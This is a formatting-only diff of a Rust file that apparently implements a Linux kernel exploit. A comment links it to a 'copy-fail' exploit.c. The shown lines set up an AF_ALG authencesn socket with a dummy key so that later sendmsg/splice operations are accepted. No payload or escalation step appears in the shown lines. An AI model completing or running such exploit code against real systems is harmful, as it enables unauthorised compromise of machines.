@@ -20,10 +20,8 @@ pub const AAD_LEN: u32 = 8;
 // Values are irrelevant; setkey only needs to succeed so subsequent
 // sendmsg/splice ops are accepted. Matches tgies/copy-fail-c exploit.c.
 pub const AUTHENC_KEY: [u8; 40] = [
-    0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10,
-    b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A',
-    b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A',
-    b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A',
+    0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A',
+    b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A',
     b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A',
 ];
 
@@ -43,11 +41,15 @@ impl AlgSocket {
             let mut sa: libc::sockaddr_alg = mem::zeroed();
             sa.salg_family = libc::AF_ALG as u16;
             for (i, b) in SALG_TYPE_AEAD.iter().enumerate() {
-                if i >= sa.salg_type.len() { break; }
+                if i >= sa.salg_type.len() {
+                    break;
+                }
                 sa.salg_type[i] = *b;
             }
             for (i, b) in SALG_NAME_AUTHENCESN.iter().enumerate() {
-                if i >= sa.salg_name.len() { break; }
+                if i >= sa.salg_name.len() {
+                    break;
+                }
                 sa.salg_name[i] = *b;
             }
 
@@ -59,11 +61,16 @@ impl AlgSocket {
             {
                 let e = last();
                 close_fd(ctrl_fd);
-                return Err(if matches!(e, Error::Syscall(libc::ENOENT) | Error::Syscall(libc::EAFNOSUPPORT)) {
-                    Error::AlgUnavailable
-                } else {
-                    e
-                });
+                return Err(
+                    if matches!(
+                        e,
+                        Error::Syscall(libc::ENOENT) | Error::Syscall(libc::EAFNOSUPPORT)
+                    ) {
+                        Error::AlgUnavailable
+                    } else {
+                        e
+                    },
+                );
             }
 
             if libc::setsockopt(
